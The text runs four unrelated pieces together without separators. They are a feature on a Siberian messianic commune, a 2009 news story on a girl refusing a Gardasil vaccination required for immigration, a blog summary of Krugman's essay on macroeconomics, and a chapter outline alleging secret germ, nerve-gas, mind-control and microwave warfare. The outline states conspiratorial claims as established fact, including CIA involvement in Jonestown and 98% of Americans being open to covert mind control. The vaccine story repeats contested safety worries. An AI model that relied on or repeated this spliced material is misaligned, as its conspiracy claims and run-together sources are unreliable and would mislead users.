" He radiates incredible love , " sighs Hermann , 57 , a Bavarian engineer who is now selling his home in Germany to join the self - proclaimed messiah of the taiga .
" I met Vissarion last August .
He told me we had to follow two laws .
It was like an electric shock , like bells ringing . "
To find Vissarion , you fly 3,700 km east from Moscow to the southern Siberian town of Abakan , north of the Mongolian border , then drive for six hours along rutted roads through a string of villages .
Where the road ends in a rollercoaster of craters , the bog begins , and you trudge knee - deep in mud and ice for three hours before the final ascent to the " saviour " , a steep hour 's climb up a mountain path .
To witness the lives of these New Age dropouts in the hamlets of Kuragino , Imisskoye , Petropavlovka and Cheremshanka is to get an inkling of how things must have been in 17th - century New England for the pilgrim fathers toiling away at their new Jerusalem .
" Life is so hard here , " says Denis , a 21 - year - old Russian emigre who arrived last week from Brisbane to see if Vissarion really was the answer to his questions .
" No doubt about it , mate , " he affirms .
" Definitely the Son of God . "
To his critics in the established churches who accuse him of brainwashing and embezzling his followers , Vissarion is a charlatan deluding the devotees of " a destructive , totalitarian sect " .
More prosaically , he is Sergei Torop , a 41 - year - old former traffic cop and factory worker from Krasnodar in southern Russia , who moved to Siberia as a youth , experienced his awakening a decade ago , and now leads one of the biggest and most remote religious communes on the planet .
Combining new age eclecticism with medieval monasticism , the " Vissarionites " , clustered in around 30 rural settlements in southern Siberia , now number around 4,000 .
They are unquestioningly dedicated to their guru .
They utter his name in hushed tones .
They decorate their homes , temples and workplaces with his image .
They reverentially swap tales of the Teacher 's every act or word .
They pore over his four fat volumes of musings .
His aphorisms are learned by rote and regurgitated daily .
Vissarion - like all the followers of his " Church of the Last Testament " , he goes by his adopted first name only - is untroubled by this cult of personality and its sinister resonance in Russian history .
" It depends how a person uses my image , " he explains .
" Man has to bow down to the Father .
But it is a mystery and the image enables a person to connect with me .
The image can help in that sense , strengthen his efforts . "
Vissarion 's commune is governed by arcane rituals , laws , symbols , prayers , hymns , and a new calendar .
A strict code of conduct is enforced : no vices are permitted .
Veganism is compulsory for all , though exceptions can be made for infants and lactating mothers , who are allowed sour milk products ( if they can find them ) .
There is no animal husbandry .
Monetary exchange is banned within the commune , and only reluctantly allowed with the outside world .
" We 're not allowed to smoke , or swear , or drink , " laughs Larissa , a glowing 28 - year - old mother of three who arrived here from Moscow with her mother as an 18 - year - old .
" Everything is banned here .
We 're not allowed to do anything except fall in love . "
The devotees include Russian musicians , actresses , teachers , doctors , former Red Army colonels , an ex-deputy railways minister of Belarus , as well as a growing band of adherents from western Europe .
They drink the sap of the birch trees that they fell for housing , tools and furniture .
They live off berries , nuts and mushrooms gathered in the forest .
They scratch potatoes , cabbage and Jerusalem artichokes from the unyielding soil .
They barter handicrafts and vegetables for buckwheat and barley from nearby villages .
" Man can live in any extreme conditions , " Vissarion pronounces , a permanent Mona Lisa smile playing on his lips .
" Of course it is hard , especially for intellectuals and those used to working in the towns .
But it is important for people to see themselves and to see one another .
That is easier when the toil is hard .
There is salvation in hardship . "
On an adjacent peak , a large bell has been mounted by the believers .
It tolls across the valley three times a day .
On hearing it , the faithful drop to their knees to pray .
The bell weighs 270kg .
The followers carried it on foot for 50 km in torrential rain from the village where the metal was cast , and then hauled it up to the summit .
Vissarion himself is spared much of the physical toil .
While teams of young men dig irrigation trenches beside his chalet , he whiles away the long days on the mountaintop painting oil canvases .
At the age of 18 Sergei Torop enlisted , starting his compulsory two - year stint in the Red Army and finishing as a sergeant on construction sites in Mongolia before working for three years as a metal worker in a factory in the Siberian town of Minusinsk .
From there , the self - proclaimed saviour embarked on a career as a traffic policeman , also in Minusinsk , winning nine commendations during five years ' service .
Job cuts in 1989 left him unemployed just as the Soviet Union was descending into chaos .
Millions of Russians were bewildered and craving answers .
The advent of the new era also coincided with Sergei 's rebirth as Vissarion .
Thousands of people , the majority of them educated professionals from cities in European Russia , abandoned wives , husbands and children to flock to the Church of the Last Testament , replicating the flight of the schismatics to Siberia from European Russia 350 years ago to escape persecution by the Orthodox church .
The schismatics ' descendants now share some of the same villages with the Vissarionites , who have assimilated many elements of Orthodox ritual but whose belief system also embraces an eclectic , some say incoherent , mish - mash of Buddhist , Taoist and green values .
For centuries , the wide - open spaces of Siberia have drawn the sectarian , the wacky and the nonconformist .
The post -Soviet decade has revived that tradition , bringing a boom in evangelism and new age cults .
Of 140 religious organisations registered in the republic of Khakassia , says Nikolai Volkov , the chief local government official dealing with religious affairs , 28 are " new religious movements " , as new age sects are dubbed .
For the Church of the Last Testament , it is now year 42 of the new era , which the believers date from Vissarion 's birth in 1961 .
Christmas has been abolished and replaced by a feast day on January 14 , the Teacher 's birthday .
The biggest holiday of the year falls on August 18 , the anniversary of Vissarion 's first sermon in 1991 , when the " saviour " descends from the mountain on horseback to join thousands of revellers cavorting in the river running by the hamlet of Petropavlovka .
To the east lies Sun City .
It is here , at the foot of the mountain where their saviour lives with his wife and six children ( including a little girl adopted from a single mother in the commune ) , that the hardcore faithful , the most committed of the Vissarionites , congregate .
On a patch of taiga peat bog that they have cleared of birch and cedar , 41 families live in timber cabins and felt yurts .
The men sport ponytails and beards , the women long hair and long skirts .
Most of them are in their mid-30s .
The giggling of children is all around .
There is a school and a kindergarten .
The birth rate here is much higher than in the average Russian village .
The mood is cheerfully apocalyptic .
" Have you not heard ? " laughs Igor as he guides us through the swamp .
" A comet is going to smash into the earth next year . "
With his beard , birch stick , tunic and pointy Uzbek felt hat , the 48 - year - old recovered alcoholic from St Petersburg looks like he has walked off the set of Lord of the Rings .
If the looming comet imperils most of humanity , Sun City is Noah 's Ark .
Russia 's mission , in the best Orthodox tradition of " Third Rome " messianism , is to redeem the rest of us .
" This central part of Siberia is the part of the world that can survive best , " explains Vissarion .
" And this is a society that can endure big changes and be more receptive to a better understanding of the truth . "
For now , though , the apocalypse can wait .
There 's work to do and word to spread .
In recent years Vissarion has been to New York , to Germany , the Netherlands , France , and Italy seeking converts .
For the first time he has just been " invited " to Britain , where he hopes to preach " soon " .
Such international jetsetting feeds suspicions that he is living at their expense of his disciples .
He insists that neither he nor his church has any " regular income " , that his foreign travels are " sponsored " by his hosts .
His chalet , powered by solar batteries and a small windmill , is modest , if more comfortable than the homes of his followers .
It is also more remote , a steep hour 's climb up a path from Sun City .
" I 've been with him 10 years , I know him , " says Vadim , a former drummer in a Russian rock band and Vissarion 's right - hand man .
" He 's the only person I know who lives what he preaches .
They say he 's a liar and a cheat , taking the money .
They 're only describing the way they behave themselves . "
At 7 am , the menfolk and a few women emerge from their cabins to stream towards the " city " centre , marked by a mud circle ringed by stones , at the centre of which stands a carved wooden angel , wings outstretched , and capped by the Vissarionites ' symbol - a cross inside a circle .
This is a daily ritual .
The faithful kneel on short wooden planks , murmur prayers and sing hymns , led by a man with a rich baritone .
Then they join hands in a circle around the stones , raise their heads to the mountain , from where they believe Vissarion is watching , and sing paeans to " our tender father " .
" Immortality is the unique quality of the human soul , but mankind has to learn how to achieve it , how to live eternally , " Vissarion says quietly before shrouding his head in a white shawl and shuffling away .
" There 's a place in the New Testament where Jesus says the time will come when I will no longer speak in parables .
That time has come : the time for people to see the aim of life . "
Girl Rejects Gardasil , Loses Path to Citizenship Immigrant girls required to take controversial vaccine but not American teens .
Sept. 11 , 2009  -- Born in Britain in 1992 , Simone Davis got off to a rough start in life .
Her biological mother abandoned her as a baby , and her father could n't care for her .
At 3 , her paternal grandmother Jean Davis got court orders giving her complete parental rights and responsibility to raise Simone until the age of 18 .
Davis married an American in 2000 and moved them to Port St. Joe , Fla. , but there was no equivalent guardianship in the United States .
So for the last near decade , Davis has embarked on a quest to get Simone U.S. citizenship .
Now 17 and an aspiring elementary school teacher and devout Christian , Simone has only one thing standing in the way of her goal -- the controversial vaccine Gardasil .
Immigration law mandates that Simone get the vaccine to protect against the sexually transmitted human papillomavirus , which has been linked to cervical cancer .
But Simone , who has taken a virginity pledge and is not sexually active , does n't see why she should have to take the vaccine , especially since it 's been under fire recently regarding its safety .
And none of her American classmates is mandated by law to be vaccinated .
" I am only 17 years old and planning to go to college and not have sex anytime soon , " said Simone .
" There is no chance of getting cervical cancer , so there 's no point in getting the shot . "
Since 2008 , the government has required that female immigrants between the ages of 11 through 26 applying for permanent resident or refugee status receive Gardasil , which was approved by the Food and Drug Administration in 2006 .
Simone and her adoptive mother she still calls " Nanny " sought a waiver for moral and religious reasons and were recently rejected by the U.S. Citizenship and Immigration Services .
That ruling threatens to separate Simone and Davis , and could dash the teen 's plans to attend Pensacola Christian College , where she was conditionally accepted .
They were given 30 days to appeal or the teen would face being " removed . "
The 1996 Immigration and Naturalization
Act requires girls and women within a specified age group to receive the vaccination against certain specified diseases " and any other vaccinations recommended by the CDC's Advisory Committee for Immunization Practices .
Gardasil was added to the list of vaccines in 2008 .
" The decision to include HPV as a required vaccine was made by the CDC , " said Citizenship and Immigration Services spokeswoman Chris Rhatigan .
" We follow the law , " she told ABCNews.com .
" The objection to a waiver would have to be to all vaccines , not just Gardasil . "
The CDC is expected to publish new criteria to determine which vaccines should be recommended for U.S. immigrants in about a month , according to spokeswoman Christine Pearson .
Simone 's struggle began in 2000 , when U.S. authorities did not recognize the British adoption papers , and the process began anew .
" We never heard from her mother again after she sent a third birthday card , and was never given a contact address , " said Jean Davis , who is now 63 , divorced , and a teacher .
" I had no idea where she was . "
The Salvation Army Missing Person 's Bureau traced Simone 's biological mother , and the American adoption was finalized in 2006 .
Local churches helped pay more than $ 1,700 immigration application fees for Simone 's permanent residency status , the first step toward citizenship .
For another $ 585 , Davis can appeal , but says she does n't have the money .
Citizenship Dashed by Gardasil
If Simone does not become a permanent resident by her 18th birthday in January , she willl have to reapply as an adult and wait five years before she can even be eligible for citizenship .
" I kind of feel like they may be experimenting with immigrants to see how we will react and then give the vaccine to citizens , " said Simone .
" I told Nanny that if it is such a great vaccine , why is n't it mandatory for everyone ? "
Gardasil must be administered before the age of 26 to be effective , according to FDA guidelines .
It protects against HPV types 6 , 11 , 16 and 18 .
Almost 70 percent of cervical cancer cases and 90 percent of genital warts are linked to these four strains .
About 12,000 women a year are diagnosed with cervical cancer , which kills about 4,000 annually , according to the CDC .
The vaccine can cause fainting , redness and inflammation at the site and fever .
The most dangerous side effect , which has alarmed some gynecologists , is an increase in blood clots , which , according to an article in the Journal of the American Medical Association ( JAMA ) , may have caused 32 unconfirmed deaths .
In an accompanying editorial , the journal complained about the lack of concrete evidence that the vaccine is effective .
When Gardasil was added to the vaccine list last year , it drew anger and protests from immigration advocates , who argued that it placed an unfair financial burden on women .
A three - shot series of the vaccine can cost between $ 300 and $ 1,400 .
Some health care policy experts suggested the requirement was excessive and unnecessary .
Of the 14 required vaccines , 13 are designed to combat infectious diseases that are considered highly contagious .
But Gardasil targets a virus spread through sexual contact .
Though 18 states are currently debating whether to make the vaccine mandatory , none , so far , require it .
" I am most definitely surprised and I would love to know how it ever became policy , " said Dr. Jacques Moritz , director of gynecology at St. Luke 's - Roosevelt Hospital in New York City .
" I wonder if the drug company could have had any influence . "
" It 's a voluntary vaccine , and for the U.S. government to make it a mandatory decision to come to this country is crazy , " he told ABCNews.com .
" It has no public health value that has been shown . "
Merck & Co. , which makes Gardasil , said it had no involvement in the enactment of the mandate .
" Merck recognizes that many individuals and groups are concerned over this requirement and emphasizes that , while we encourage all women to be educated about HPV - related diseases , the company does not support mandatory vaccination of new female immigrants , " said Merck spokeswoman Pam Eisele .
The company said it has an " extensive and ongoing " safety - monitoring program and does not believe that reported deaths have been caused by Gardasil .
" Nothing is more important to Merck than the safety of our medicines and vaccines , " she told ABCNews.com .
" We are confident in the safety profile of Gardasil .
The company garnered $ 1.4 billion in sales last year .
According to the business publication Medical Marketing and Media , the company has " captured lightning in a bottle " with its direct - to - consumer marketing to mothers and their daughters , encouraging them to talk to their doctors about protection from HPV .
Just this week , an advisory panel recommended that the FDA allow doctors to prescribe Gardasil to boys and men ages 9 to 26 to help prevent genital warts , which have been linked to the transmission of HPV .
Moritz , himself , has chosen not to have his 11 - year - old daughter vaccinated , as long as good cervical cancer screening tests , like the Pap smear , exist .
" I'm pro-preventing cervical cancer , " he told ABCNews.com .
" But I 'm not that pro that the physicians do n't know the risks and side effects . "
But Dr. Mark Einstein , associate professor of obstetrics and gynecology at the Albert Einstein College of Medicine and Montefiore Medical Center in New York , disagrees .
" Every scientific stakeholder has advocated for use of this vaccine , " he told ABCNews.com .
" The more serious side effects may not be vaccine related .
The most recent report in the JAMA was positive , reinforcing the safety of a vaccine that been delivered to 26 million in the U.S. "
Einstein said cervical cancer was " not just a Third World Disease . "
American women are struck in their " reprodictive prime , " and radiation treatments can cause sexual dysfunction and child - bearing problems .
" I have a busy clinical schedule , " said Einstein .
" The death rate is low because the treatments are very effective .
But the treatments are toxic and have very serious side effects through life .
" We have a lot of opportunity to prevent [ cervical cancer ] before it happens and shift the future of a disease , " he said .
Einstein also debunks
Simone 's claim that she does n't need the vaccine because she is not having sex .
" Quite frankly , from a science standpoint and outreach , everyone does ultimately as an adult have sex , " he said .
But her adoptive mother , Jean Davis , said the issue is about more than chastity .
" All we want is the rights of a U.S. citizen , " said Davis , who has scoured the Internet for research on Gardasil and sent letters to all her political leaders , including the president .
" It 's not mandatory for them to get this .
That 's our objection .
" My choice to make an informed decision for the health of my child has been taken away , " she told ABCNews.com .
" I have been like a crazy woman , I have been so upset about this .
I am really in a panic . "
" How can they call this America , the land of the free ? " she asked .
" Where are my parental rights ? "
This weekend ’s New York Times Magazine has the 7,000 - word article about the state of macroeconomics that Paul Krugman has been hinting at for some time now .
It ’s a well - written , non-technical overview of the landscape and the position Krugman has been presenting on his blog , which for now I ’ll just summarize for those who may not have the time to set aside just now .
Like many , Krugman faults the discipline for its infatuation with mathematical elegance :
“ [ T ] he central cause of the profession ’s failure was the desire for an all - encompassing , intellectually elegant approach that also gave economists a chance to show off their mathematical prowess .
“ Unfortunately , this romanticized and sanitized vision of the economy led most economists to ignore all the things that can go wrong .
They turned a blind eye to the limitations of human rationality that often lead to bubbles and busts ; to the problems of institutions that run amok ; to the imperfections of markets — especially financial markets — that can cause the economy ’s operating system to undergo sudden , unpredictable crashes ; and to the dangers created when regulators do n’t believe in regulation . ”
His history of post - Depression macroeconomics goes through roughly three phases : Keynesianism ; Milton Friedman and monetarism , which , he argues , was relatively moderate compared to the positions of some of his self - styled followers ; and the period from the 1980s until 2007 , which he describes as the conflict between the Saltwater ( coastal , pragmatic , New Keynesian ) economists and the Freshwater ( inland , efficient markets , neo - classicist ) economists .
According to Krugman , these two schools had differences on a theoretical level , but those differences were papered over by practical agreement on government policy : namely , monetary policy was superior to fiscal policy at managing the economy .
This false peace was exploded during the financial crisis by the zero bound , something Krugman has invoked often .
The agreed - upon way to stimulate the economy in a recession is to lower interest rates .
When interest rates hit zero , they ca n’t be lowered anymore ( rather than lend you money and expect to get less back in the future , I should put it under my mattress ) , and then the policy question is what if anything else should be done .
This provoked the fallout between people who favored the stimulus as a way of propping up demand and those who thought that for theoretical reasons a stimulus could not possibly have any positive impact .
In addition , Krugman argues , the two sides shared the same desire to represent the world using elegant mathematical models : “ But the New Keynesian models that have come to dominate teaching and research assume that people are perfectly rational and financial markets are perfectly efficient . ”
Instead , we need to look to behavioral finance and behavioral economics , which has just gone from a hot fad in economics to the bandwagon to end all bandwagons .
Krugman mentions Larry Summers ’s “ There Are IDIOTS ” paper , which must now be the world ’s most - cited - although - unpublished article , Robert Shiller , Andrei Schleifer , and Robert Vishny in particular .
This is from Krugman ’s conclusion :
“ So here ’s what I think economists have to do .
First , they have to face up to the inconvenient reality that financial markets fall far short of perfection , that they are subject to extraordinary delusions and the madness of crowds .
Second , they have to admit — and this will be very hard for the people who giggled and whispered over Keynes — that Keynesian economics remains the best framework we have for making sense of recessions and depressions .
Third , they ’ll have to do their best to incorporate the realities of finance into macroeconomics . ”
In other words , the world is messy and people are irrational , and as a result the world breaks down occasionally .
The field of economics has been going on a massive land - grab over the past few decades .
It ’s ironic that the area it seems to understand the least well is how an overall economy functions .

THE INVISIBLE THIRD WORLD WAR
BY
W.H. Bowart and Richard Sutton

( Synoptic Chapter Outline )
I . THE MAGIC ARSENAL -- INTRODUCTION
The first atomic explosion at Alamagordo , N.M. in - 1944 was a flash of insight to the warriors of the modern world .
That flash changed the nature of war forever .
The men who built the bomb immediately realized that conventional war was suddenly a dangerous trigger which , at any time , might detonate an earth destroying retaliation with nuclear weapons .
The realities of nuclear war made civilian populations the target of war , and thus changed the nature of even limited , conventional war .
Gun powder now became the tool of non-nuclear nations and revolutionaries who would fight long protracted conflicts , tempting the nuclear powers that be .
Just as nuclear war changed the nature of conventional war , it made Invisible War ( IW ) a necessity .
The only safe way to wage war , the warriors realized , was to wage it silently .
Toward the end of World War Two various forms of IW research began , and eventually modern warriors came up with a number of insidious ways to subdue enemy populations without their ever knowing that a war had even begun .
Today secret " invisible weapons " pose a more ominous threat to life than even thermonuclear holocaust .
These weapons have not only been developed without the knowledge of their intended victims , they cannot even be detected at the very monent they are murdering or robotizing civilian populations .
Only by lifting the veil of secrecy and informing humanity of the realities of IW can free people everywhere survive to liberate themselves from the bleak , unliveable future promised by the technology of Invisible War .
PART ONE -- CHEMICAL AND BIOLOGICAL WARFARE
II . THE SECRET PLAGUES .
Governments do experiment on their own citizens .
In the Soviet Union the victims never talk , but in a supposed free society if they can remember they have been victimized they might even sue .
A secret CIA - Army team infected Americans with deadly germs from 1949 to 1969 .
Equipped with nasal filters and other protective gear , these cladestine agents of OPERATION BIG CITY targeted Hawaii , Alaska , New York , Florida , and California with biological weapons ( BW ) .
Using trick suitcases and a 1954 Mercury equipped with dual mufflers and extended tailpipes , the spooks cast their clouds of plague along four New York City turnpikes and through the commuter - choked Licoln and Holland tunnels .
Attacks on Florida and New York were followed by epidemics of encephalitis and whooping cough .
Thirty years after a secret attack on San Francisco Bay launched from a Naval vessel in 1950 , victims finally responded with angry lawsuits against the government .
( 1 ) Government agents also injected thousands of unsuspecting Americans with germs such as syphilis . ( 2 )
Similar incidents occurred in Britian and the Soviet Union .
The full grisly story can be told now that formerly secret BW documents have been released after nearly 30 years .
Just the tip of the invisbile iceberg , the fact that innocent civilians have been victimized by their own governments drives home the threat posed by today 's invisible technologies of war .
III .
MICROBIOLOGICAL HOLOCAUST
Warriors have been busy with BW weapons since the prehistoric days when shamans first poisoned their enemies .
( 3 ) The memory of the political use of disease during the Crusades and Inquisition may have been too fresh in Hitler 's mind to allow him to unleash the vast germ arsenal amassed by Nazi scientists ( 4 ) .
The Japanese , however , had no such compunctions , and , after the war , Germ Warfare trials were held which convicted a number of their war criminals .
Those trials , more sensational than the Nuremburg trials , got little attention from the press of the day .
BW was next used in Korea , then in Vietnam ( 5 ) .
Perhaps the most hideous story is that of the leakage of anthrax germs from weapons in the remote secret city of Semipalatinsk in the Soviet Union .
There , just a few years ago , hundreds died in horrible agony ( 6 ) .
Current developments in Recombinant DNA threaten to unleash mutant BW strains from which the world may never recover ( 7 ) .
Despite international treaty , most nations today cheat when it comes to BW ( 8 ) .
According to recently released Pentagon documents , the Soviets may have used both BW and CW weapons in Afghanistan .
IV . ROCKY MOUNTAIN PLAGUE
News of secret , leaking Army WETEYE nerve gas canisters in Denver , Colorado sent shivers through denizens of the Mile High City .
Would Denver be America 's first Semipalatinsk ? ( 9 ) A controversy over how to dispose of the WETEYE bombs has rage during the past few years in Utah and Colorado .
The U.S. government wanted to ship the bombs to a remote location in Utah , since the task of neutralizing the bombs seemed impossible .
The government announced they would load the bombs on airplanes and fly them from Denver to the remote Utah location .
The citizens of both states did n't want leaking bombs flown over the countryside so a loud protest arose .
Today , those WETEYES sit in a storage depot next to busy Stapleton International Airport oozing their toxic contents while legislators of Colorado and Utah battle Pentagon bureaucrats over the life - and - death question of what to do with unwanted nerve gas .
V . WIZARDS OF DEATH
Like BW , Chemical Warfare ( CW ) was developed in most ancient times and used during World Wars One and Two , Korea and Vietnam .
Disguised as a " herbicide " during Vietnam , the CW Agent Orange poisoned thousands of American GI's .
Today those GI 's suffer on without compensation from Uncle Sam who continues to deny the dangers of Agent Orange ( 10 ) .
Mocking every treaty in the books , the Soviet Union attacked Afgan rebels in 1980 with deadly " soman " nerve gas .
According to Lt. Gen. Nikolai Chernov , the Soviets equip every division with TMS - 65 decontaminant trucks .
Soviet - led Warsaw
Pact troops regularly conduct nerve gas war games using " live " weapons and deploying one hundred thousand CBW specialist troops .
The U.S. maintains three million convulsion causing sarin artillery shells , , several thousand sarin bombs , and hundreds of thousands of gas land mines .
Nerve gas weapons comprise two thirds of the 150,000 tons of poison gas in the American aresnal ( 11 ) .
As they did with BW , the CIA " tested " chemical weapons on U.S. citizens , attacking hundreds of unsuspecting GI 's with BZ , a hallucinogenic one hundred times more powerful than LSD ( 12 ) .
It was hard for the BZ victims to complain of after effects of the tests , since BZ left the victims with amnesia .
Despite the resignation of CIA intelligence expert John Stockwell over CW revelations and his shocked protest of Agency atrocities , a powerful CBW lobby today demands repudiation of all treaties outlawing germ and nerve gas weapons ( 13 ) .
CW development overlaps that of BW and with the growth of the new science of genetic engineering , it poses an an even greater danger through its invisibility than does the well known and expected nuclear holocaust .
PART TWO -- MIND CONTROL
VI .
THE CIA - NAZI CONNECTION
Clandestine wizards of " cold war " have searched for new technology to forcibly control the human mind for over forty years ( 14 ) .
At the close of World War Two , the leaders of Nazi and U.S. intelligence agencies joined forces to construct an allied intelligence network .
The Nazi spy chief Reinhard Gehlen , the OSS 's William Donovan , and the FBI 's J. Edgar Hoover all conspired to develop mind control weapons before the outbreak of the war .
Hoover and Donovan , like their Nazi counterparts , commissioned leading psychiatrists in their nation to come up with an automaton making technology ( 15 ) .
The Nazi research began during the twenties at the Kaiser Wilhelm Institute ( 16 ) .
Some of this research inspired the concentration camp atrocities of Mengele and others .
Early American research victimized convalescing WWII veterans .
The Nazi inspiration for the CIA Mind Control operations has recently been documented with the declassification of Project Paperclip ( 17 ) .
Paperclip evolved into a series of CIA projects using unsuspecting civilian guinea pigs -- BLUEBIRD , ARTICHOKE , MKULTRA , MIDNIGHT CLIMAX and others ( 18 ) .
Previously unpublished material illustrates how America 's most respected , influential psychiatrists conspired to unleash mind control weapons on unsuspecting Americans and succeeded ( 19 ) .
VII .
AMERICAN FRANKENSTEIN
Mind control has been the most sought after military weapon since the days of Ancient China 's legendary warlord , Sun Tzu .
It was developed and refined through the succeeding civililzations of India , China , Egypt , the Mayan Empire . , Greece , Rome , Medieval Europe , Nazi Germany , Soviet Russia , Red China , and finally the United States .
Some of the methods of mind control are sexual manipulation ( 20 ) , drug - hypnosis , behavior modification , and other methods which control an invidual 's freedom of thought .
Despite earlier denials , the CIA did successfully brainwash Americans ( 21 ) .
VIII .
THE CIA IN JONESTOWN
Institutionalized Psychiatry has become an instrument of civilian control in the Modern State .
Mind control police tactics have replaced the criminal justice system in the Soviet Union .
Behind the Iron Curtain , where intolerable conditions Would otherwise spark revolt , psychiatric techniques have turned the Soviet population into a herd of terrified and apathetic atomatons ( 22 ) .
High technology Soviet mind control has been employed against political dissidents .
In the United States the American Mental Health Industry holds Soviet - style plans to replace the American justice system with mind control operations ( 23 ) .
The late Congressman Leo Ryan 's aide , Joe Holsinger , describing the CIA 's involvement in Jonestown poses the question :
What role did mind control technology play in the Jonestown massacre ?
Through the CIA 's mind control technology , 98 % of the U.S. population is susceptible to covert control .
At that success rate , America might be turned into a nation of obedient , suicidal zombies heralded by those who died in Jonestown ,
PART THREE -- ELECTROMAGNETIC
MIND CONTROL
IX . THE MOSCOW SIGNAL
Soviet forces have been beaming invisible microwave radiation at Americans for over twenty years , triggering cancer , heart problems , cataracts , and emotional stress ( 24 ) .
The bizarre Soviet zapping of the U.S. embassy in Moscow , " The Moscow Signal " , may well have been the opening volley of the Invisible War of electromagnetic weaponry .
While sweeping the embassy for bugs in 1962 , security personnel detected a microwave beam aimed straight at the embassy ( 25 ) .
Naturally , the Pentagon and Intelligence Community became alarmed at the possibility of neurological and behavioral effects on diplomatic personnel .
Keeping the knowledge secret from the suffering embassy staff for 12 years , the CIA launched PROJECT PANDORA ( 26 ) , aimed at understanding the Soviet 's motives for the microwave attack .
Pandora personnel discovered that the Soviets had conducted extensive microwave research operations over the years
They concentrated their study on the emotional and rental effects of microwaves .
By the summer of .
1965 , a Pentagon - affiliated think tank , Institute for Defense Analysis , convened a special task force to replicate Soviet experiments and analyze the problem .
The Defense Advance Research Projects Agency ( DARPA ) began experimenting on rhesus monkeys with microwaves at Walter Reed Army Research Insitute .
The results are still classified Top Secret , but , from recent duplicate studies we learn that microwaves cause ' profound effects on the central nervous system and change behavior of rhesus monkeys .
At a summit meeting at Glassboro , New Jersey during June , 1967 , President Lyndon Johnson asked Soviet Premier Alexi Kosygin to halt the Moscow Signal ( 27 ) .
In 1969 , leading microwave scientists gathered at the University of Virginia Medical College at Richmond for a three day - symposium on Biological Effects and Health Implications of Microwave Radiation ( 28 ) .
Microwave authority Dr. Karel Marha of Czechoslovakia declared that microwave bioeffects included pains in the head and eyes , fatigue and overall weakness , dizziness and vertigo , poor night sleep , , irritibility , fear , hypochondria , tension , depression , inhibition of intellectual functions , and decreased memory ( 29 ) .
Yet , most of those at the symposium ignored the subject of human bioeffects .
Radomline Research biophysicist Dr. Allan H. Frey was more than interested , however Frey had determined that humans could actually hear pulsed microwaves at frequencies ranging from 300 to 3,000 megahertz .
Not until Jack Anderson broke the " Moscow Signal " story ill 1972 did the public learn the truth .
Several months after Anderson 's microwave column , the Soviets accused the U.S. of irradiating chess wizard Boris Spaasky with electronic devices , causing him to lose a championship match to Bobby Fischer ( 30 ) .
On February 7 , 1976 , the Los Angeles Times quoted U.S. Ambassador Walter J. Stoessel , Jr. , as telling his staff that the microwavess could cause leukemia , skin cancer , cataracts , and emotional illness ( 31 ) .
Stoessel himself was reportedly suffering from a mysterious illness resembling leukemia which caused bleeding in the eyes and nausea .
Two of his predecessors at the embassy died of cancer .
According to National Security Advisor Zbignew Brezhinski , U.S. embassy personnel in Moscow suffer the highest cancer rate in the world ( 32 ) .
Today , despite a brief respite , the bombardment of the embassy continues while much of the evidence gathered by U.S. intelligence agencies remains classified ( 33 ) .
However , raising the lid on PROJECT PANDORA has uncovered a box full of secrets about microwave effects ..
X . THE EUGENE WAVELENGTH
" A powerful radio signal that may be affecting human health has been monitored in several Eugene locations and in the air three thousand feet above the city , " proclaimed the Eugene Register - Guard on March 26 , 1978 .
" The source of the radio signal is unknown . "
Thus came to light news of the .
first electromagnetic biohazards suffered by a major population center ( 34 ) .
Shortly before the Register - Guard printed the story , a middle - aged Eugene man , Walter Deposkey , came down with symptoms remarkably similar to those attributed to microwave sickness ( 35 ) .
He noted a strange vibration emanating from within his home .
He heard voices .
He could not sleep .
He suffered burning of his cornea .
University of Oregon industrial hygeinist Marshall van Ert , called to investigate Deposkey 's complaints , suffered the same symptoms in the man 's home .
Disturbed , van Ert recruited several local engineers to investigate .
The engineers measured an unusual radio signal they determined was capable of producing potential biohazards .
After dogging public health agencies to investigate further , van Ert broke the story in the papers ( 36 ) .
The Eugene Signal was described as a radio frequency pulse at 4.75 megahertz , 1,100 cycles per second , recorded within at least two local homes as well as 3,000 feet above the city ( 37 ) .
The signal 's strength was rated at five hundred thousand watts -- ten times the FCC AM licensed limit .
The signal extended as far away as the next town , Corvallis .
150 documented complaints about the signal prompted Governor Bob Straub , Senator Mark Hatfield , and Congressman Jim Weaver to demand an EPA investigation ( 38 ) .
A data analysis by the State Health Department 's Radiation Control Section suggested " probable cause " linking the complaints to the strange frequency ( 39 ) .
" I was surprised , " said Clifford Shrock , a Textronix , Inc. radio frequency analyst who had written CIA and NSA electronics manuals , " I 'd never seen anything like it before . " ( 40 ) Reactions to the story " flooded in from around the world .
Calls came in from people telling similar stories about their own distant areas .
Several calls came from technicians offering their hypotheses about the signal , suggesting a possible link to secret weapons readiation .
The people of Eugene began to learn about Electromagnetic Radiation ( EMR ) biohazards in a hurry .
No one , however , could get to the bottom of Eugene 's problem .
The FCC's .
Enforcement Division Assistant Chief , Richard Smith , laid the blame squarely on a naval transmitter at Dixon , California -- the " Dixon Duck " ( 41 ) .
Van Ert and others disputed this conclusion .
The Navy denied it .
When the EPA technicians finally arrived , they decided no real Problem existed and denied that there was any mystery signal .
Van Ert , Shrock , and others strongly disagreed with them .
They had felt the signal and had measured it .
But , after holding a cursory press conference , the EPA investigators returned to its Las Vegas headquarters and dodged reporters .
Then the investigation folded .
While some of the citizens of Eugene , Oregon say they continue to suffer from the signal effects , the Eugene Signal remains an official mystery .
Marshall Van Ert left Eugene after he began suffering from EMR symptoms .
Today he is still convinced he was - victimized by secret IW radiation and a government coverup .
The people of Eugene are n't the only ones complaining of EMR biohazard effects .
Similar symptoms have been reported in such places as Timmons and Kirkland Lake in Canada .
These effects were traced to a notorious Soviet radio broadcast dubbed by amateur radio operators " the woodpecker . " ( 42 ) These effects bear a strong resemblance to the biohazards inherent in Invisible Weapons like the electromagnetic pulse ( EMP ) under development by the Pentagon .
Although the people of Eugene did n't know it , both the U.S. and Soviet military had been working for years to perfect the use of electromagnetic frequencies as lethal psychological weapons .
XI . THE WOODPECKER
On October 14 , 1976 , radio communications throughout the globe were disrupted by powerful radio waves emanating from the Soviet Union ( 43 ) .
The broadcasts appeared irregularly and varied between very high and very low frequencies .
When the U.S. , Canada , Great Britain , and the Scandinavian countries protested the broadcast , the Soviets apologized , blaming the disturbance on " experiments . "
But then the nature of the wavelengths changed and huge electromagnetic standing waves formed , thousands of miles long , penetrating the earth and extending up into the ionosphere .
Due to its characteristic sound , the signal was dubbed " the woodpecker " .
The sound ham radio operators heard all over the world can be replicated by tapping a pencil on a table at between eight and fourteen times each second .
The wavelength was traced to alleged " Tesla generator " experiments in the Soviet cities of Riga and Gomel .
The standing waves accompanying them stretched down both coasts of North America and along the Eastern .
frontier of the Soviet Union ( 44 ) .
